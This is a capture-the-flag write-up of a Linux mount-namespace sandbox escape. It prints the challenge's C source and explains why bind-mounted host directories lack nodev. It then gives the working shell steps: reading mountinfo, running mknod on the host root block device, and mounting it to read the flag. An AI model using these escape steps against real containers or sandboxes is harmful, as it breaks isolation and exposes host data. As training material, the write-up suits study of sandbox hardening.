#metadata(
  (
    title: "Mount Namespace Escape via Device Node Hijack",
    description: "Escaping a mount namespace sandbox by creating and mounting a block device node for the host's root filesystem, bypassing filesystem-level nodev restrictions.",
    date: "2025-12-30",
    order: 15,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Mount Namespace Escape via Device Node Hijack

== Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

#include <sys/syscall.h>
#include <sys/mount.h>
#include <dirent.h>
#include <limits.h>
#include <sched.h>

char hostname[128];

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    for (int i = 3; i < 10000; i++) close(i);

    char new_root[] = "/tmp/jail-XXXXXX";
    char old_root[PATH_MAX];

    assert(geteuid() == 0);

    assert(unshare(CLONE_NEWNS) != -1);

    // create the new root
    assert(mkdtemp(new_root) != NULL);

    // change the old root (/) to a private mount so that pivot_root succeeds
    assert(mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != -1);

    // bind-mount the new root over itself
    assert(mount(new_root, new_root, NULL, MS_BIND, NULL) != -1);

    // create a directory in which pivot_root will put the old root filesystem
    snprintf(old_root, sizeof(old_root), "%s/old", new_root);
    assert(mkdir(old_root, 0777) != -1);

    // pivot the root filesystem
    assert(syscall(SYS_pivot_root, new_root, old_root) != -1);

    assert(mkdir("/bin", 0755) != -1);
    assert(mount("/old/bin", "/bin", NULL, MS_BIND, NULL) != -1);

    assert(mkdir("/usr", 0755) != -1);
    assert(mount("/old/usr", "/usr", NULL, MS_BIND, NULL) != -1);

    assert(mkdir("/lib", 0755) != -1);
    assert(mount("/old/lib", "/lib", NULL, MS_BIND, NULL) != -1);

    assert(mkdir("/lib64", 0755) != -1);
    assert(mount("/old/lib64", "/lib64", NULL, MS_BIND, NULL) != -1);

    // unmount old root directory
    assert(umount2("/old", MNT_DETACH) != -1);
    assert(rmdir("/old") != -1);

    // make things simpler for everyone to avoid strange behavior with permissions
    setresuid(0, 0, 0);

    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    assert(execl("/bin/bash", "/bin/bash", "-p", NULL) != -1);
}

```

= Mount Namespace Escape via Device Node Hijack

== Introduction

This challenge improves upon the isolation in Level 14 by explicitly unmounting the old root directory (`/old`) using a lazy unmount (`MNT_DETACH`) and removing the mount point.

== Vulnerability Analysis

The sandbox setup is as follows:
1. Independent mount namespace via `unshare(CLONE_NEWNS)`.
2. Root filesystem pivoted to a new temporary directory.
3. Host directories (`/bin`, `/usr`, etc.) are bind-mounted into the jail.
4. The old root (`/old`) is unmounted and deleted.

Although `/old` is gone, the bind mounts (`/bin`, `/usr`, etc.) remain as active references to the host's underlying `ext4` filesystem. Because we are root within the namespace and there are no `seccomp` restrictions, we can perform privileged operations like `mknod` and `mount`.

The jail's root filesystem is a `tmpfs` mounted with the `nodev` option, which prevents the use of block or character devices. However, the bind-mounted directories (like `/bin`) are part of the host's `ext4` filesystem, which does *not* have the `nodev` restriction in this environment.

== Exploitation Steps

=== 1. Information Gathering
First, we mount `/proc` to inspect the namespace's mount table.

```bash
mkdir /p
mount -t proc proc /p
cat /p/self/mountinfo
```

The output reveals the major and minor numbers of the host's root device (e.g., `259:2` for `/dev/nvme0n1p2`).

=== 2. Creating the Device Node
We create a block device node corresponding to the host's root device. We must do this inside one of the bind-mounted directories to bypass the `nodev` restriction on `/`.

```bash
mknod /bin/root_dev b 259 2
```

=== 3. Accessing the Host Root
We create a mount point and mount our new device node. This gives us full access to the host's original root filesystem.

```bash
mkdir /mnt_host
mount /bin/root_dev /mnt_host
cat /mnt_host/flag
```

The retrieved flag was: `falg`.
